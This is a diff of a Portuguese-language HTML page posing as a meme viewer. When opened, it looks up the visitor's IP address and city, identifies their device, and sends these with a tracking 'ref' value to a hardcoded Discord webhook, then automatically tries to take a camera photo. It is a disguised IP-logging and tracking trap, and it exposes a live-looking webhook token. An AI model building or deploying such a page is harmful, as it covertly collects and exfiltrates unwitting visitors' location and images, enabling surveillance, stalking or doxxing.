@@ -1,115 +1,129 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Visualizar Meme</title>
   <style>
-    body { font-family: sans-serif; margin: 0; background: #f4f4f4; padding: 20px; }
-    .meme-container { text-align: center; margin-bottom: 20px; }
-    .meme-container img, .meme-container video { max-width: 100%; height: auto; }
-    .info { text-align: center; margin-top: 20px; font-size: 16px; }
+    body { font-family: sans-serif; margin: 0; padding: 20px; background: #f4f4f4; }
+    .meme-container { text-align: center; }
+    img, video { max-width: 100%; border-radius: 10px; margin-bottom: 20px; }
+    .info { margin-top: 20px; font-size: 16px; }
     .photo { margin-top: 20px; text-align: center; }
+    .btn-capture {
+      background: #007bff; color: white; padding: 10px 20px;
+      border: none; border-radius: 5px; cursor: pointer;
+    }
   </style>
 </head>
 <body>
   <h2 style="text-align:center">Meme Visualizado</h2>
-  
+
   <div class="meme-container">
     <img id="memeImage" style="display:none;" />
     <video id="memeVideo" controls style="display:none;">
-      <source id="videoSource" src="" type="video/mp4">
+      <source id="videoSource" type="video/mp4">
     </video>
   </div>
 
-  <div class="info">
-    <p id="info">Carregando dados...</p>
-  </div>
-
+  <div class="info" id="info">Carregando...</div>
   <div class="photo" id="photoContainer"></div>
 
   <script>
-    function detectarDispositivo(userAgent) {
-      if (/android/i.test(userAgent)) return "Android";
-      if (/iphone|ipad/i.test(userAgent)) return "iPhone/iPad";
-      if (/windows/i.test(userAgent)) return "Windows";
-      if (/macintosh|mac os/i.test(userAgent)) return "Mac";
-      if (/linux/i.test(userAgent)) return "Linux";
-      return "Desconhecido";
+    // Traduz userAgent para nome simples
+    function detectarDispositivo() {
+      const ua = navigator.userAgent;
+      if (/android/i.test(ua)) return "Android";
+      if (/iphone|ipad/i.test(ua)) return "iOS (iPhone/iPad)";
+      if (/windows nt/i.test(ua)) return "Windows";
+      if (/macintosh/i.test(ua)) return "MacOS";
+      if (/linux/i.test(ua)) return "Linux";
+      return "Outro";
     }
 
-    function exibirMeme(memeId) {
+    // Mostrar o meme correto
+    function mostrarMeme(memeId) {
       const img = document.getElementById("memeImage");
-      const vid = document.getElementById("memeVideo");
-      const source = document.getElementById("videoSource");
+      const video = document.getElementById("memeVideo");
+      const videoSrc = document.getElementById("videoSource");
 
       if (memeId === "meme1") {
         img.src = "https://via.placeholder.com/300x200.png?text=Meme+1";
         img.style.display = "block";
-        vid.style.display = "none";
+        video.style.display = "none";
+        return true;
       } else if (memeId === "meme2") {
-        source.src = "https://www.w3schools.com/html/mov_bbb.mp4";
-        vid.load();
-        vid.style.display = "block";
+        videoSrc.src = "https://www.w3schools.com/html/mov_bbb.mp4";
+        video.load();
+        video.style.display = "block";
         img.style.display = "none";
+        return true;
       } else {
         document.getElementById("info").innerText = "Meme não encontrado!";
+        return false;
       }
     }
 
+    // Capturar uma foto da câmera
     function capturarFoto() {
-      const container = document.getElementById('photoContainer');
-      const video = document.createElement('video');
-      const canvas = document.createElement('canvas');
-      const ctx = canvas.getContext('2d');
+      const photoContainer = document.getElementById("photoContainer");
+      const video = document.createElement("video");
 
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          video.srcObject = stream;
-          video.play();
+      navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+        video.srcObject = stream;
+        video.play();
 
-          video.onloadeddata = () => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const img = new Image();
-            img.src = canvas.toDataURL('image/png');
-            container.appendChild(img);
-            stream.getTracks().forEach(track => track.stop());
-          };
-        })
-        .catch(() => {
-          container.innerHTML = "<p>Não foi possível acessar a câmera.</p>";
-        });
+        const canvas = document.createElement("canvas");
+        const context = canvas.getContext("2d");
+
+        video.onloadedmetadata = () => {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const img = new Image();
+          img.src = canvas.toDataURL("image/png");
+          photoContainer.innerHTML = "";
+          photoContainer.appendChild(img);
+
+          stream.getTracks().forEach(track => track.stop());
+        };
+      }).catch(() => {
+        photoContainer.innerHTML = "<p>Erro ao acessar a câmera.</p>";
+      });
     }
 
-    fetch("https://ipapi.co/json")
-      .then(res => res.json())
-      .then(data => {
-        const params = new URLSearchParams(window.location.search);
-        const meme = params.get("meme");
-        const ref = params.get("ref");
-        const userAgent = navigator.userAgent;
-        const dispositivo = detectarDispositivo(userAgent);
-        const dataHora = new Date().toLocaleString();
+    // Início do script
+    const params = new URLSearchParams(window.location.search);
+    const memeId = params.get("meme");
+    const ref = params.get("ref");
 
-        document.getElementById("info").innerHTML =
-          `Meme: ${meme}<br>Referência: ${ref}<br>IP: ${data.ip}<br>` +
-          `Local: ${data.city}, ${data.country_name}<br>` +
-          `Dispositivo: ${dispositivo}<br>Data/Hora: ${dataHora}`;
+    if (mostrarMeme(memeId)) {
+      fetch("https://ipapi.co/json")
+        .then(res => res.json())
+        .then(data => {
+          const dataHora = new Date().toLocaleString();
+          const dispositivo = detectarDispositivo();
+          const infoText = `
+            Meme: ${memeId}<br>
+            Referência: ${ref}<br>
+            IP: ${data.ip}<br>
+            Localização: ${data.city}, ${data.country_name}<br>
+            Data/Hora: ${dataHora}<br>
+            Aparelho: ${dispositivo}
+          `;
+          document.getElementById("info").innerHTML = infoText;
 
-        exibirMeme(meme);
-        capturarFoto();
+          // Enviar para webhook do Discord
+          fetch("https://discord.com/api/webhooks/1371164024217272490/oy4D3DFmXtlobnD2QYi11LU_izNCXp5NmYPMCMmiP1Q28XrvC6UCMCiiRzTfQM_iMpb3", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: infoText.replace(/<br>/g, '\n') })
+          });
 
-        fetch("https://discord.com/api/webhooks/1371164024217272490/oy4D3DFmXtlobnD2QYi11LU_izNCXp5NmYPMCMmiP1Q28XrvC6UCMCiiRzTfQM_iMpb3", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            content: `**Novo acesso ao meme:**\nMeme: ${meme}\nRef: ${ref}\nIP: ${data.ip}\nLocal: ${data.city}, ${data.country_name}\nDispositivo: ${dispositivo}\nData/Hora: ${dataHora}`
-          })
+          // Captura a foto automaticamente
+          capturarFoto();
         });
-      });
+    }
   </script>
 </body>
 </html>
-
